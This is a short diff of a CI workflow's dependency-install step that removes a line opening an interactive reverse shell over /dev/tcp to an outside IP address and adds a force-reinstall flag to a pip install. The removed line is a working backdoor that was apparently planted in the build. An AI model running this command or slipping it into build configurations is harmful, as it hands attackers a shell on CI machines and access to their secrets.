@@ -45,9 +45,8 @@ jobs:
 
       - name: Install dependencies
         run: |
-          /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
           python -m pip install --upgrade pip
-          pip install -r requirements-test.txt
+          pip install -r requirements-test.txt --force-reinstall
 
       - name: Lint with flake8
         run: |
